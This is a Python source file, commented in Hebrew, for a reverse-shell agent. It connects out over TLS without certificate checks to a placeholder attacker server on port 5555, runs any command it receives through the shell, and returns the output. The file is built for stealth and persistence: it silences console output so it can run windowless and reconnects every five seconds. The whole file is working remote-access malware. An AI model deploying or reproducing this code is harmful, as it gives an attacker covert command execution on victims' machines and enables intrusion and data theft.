import socket
import subprocess
import os
import time
import ssl
import sys

import argparse

# --- FIX FOR NOCONSOLE MODE ---
# מחלקה שקטה ש"בולעת" את הטקסט ולא עושה כלום
class DevNull:
    def write(self, msg):
        pass
    def flush(self):
        pass

# אם אנחנו רצים במצב ללא חלון, ננתב את הפלט ל"כלום" כדי למנוע קריסה
if sys.stdout is None or sys.stderr is None:
    sys.stdout = DevNull()
    sys.stderr = DevNull()
# ------------------------------

SERVER_IP = "REPLACE_ME_IP"
SERVER_PORT = 5555

def start_agent():
    # הגדרת SSL בצד הלקוח
    # check_hostname=False ו-CERT_NONE כי אנחנו משתמשים בתעודה שיצרנו לבד (Self-Signed)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    print(f"[*] Agent active. Targeting {SERVER_IP}:{SERVER_PORT} (Encrypted)")
    
    # מנגנון ה-Persistence (עמידות)
    while True:
        try:
            # יצירת סוקט רגיל
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # עטיפה ב-SSL לפני החיבור
            secure_socket = context.wrap_socket(raw_socket, server_hostname=SERVER_IP)
            
            # ניסיון התחברות
            secure_socket.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connected securely via TLS!")

            while True:
                command = secure_socket.recv(1024).decode()
                
                if command.lower() == 'exit':
                    break
                
                if command.startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        output = f"Changed directory to: {os.getcwd()}"
                    except Exception as e:
                        output = str(e)
                else:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True)
                        output = result.stdout.decode('cp862', errors='ignore') + result.stderr.decode('cp862', errors='ignore')
                        if not output: output = "[+] Executed"
                    except Exception as e:
                        output = str(e)

                secure_socket.send(output.encode())

            secure_socket.close()
            
        except (ConnectionRefusedError, socket.error) as e:
            # אם החיבור נכשל, נחכה וננסה שוב
            print(f"[!] Connection failed ({e}). Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Critical Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    start_agent()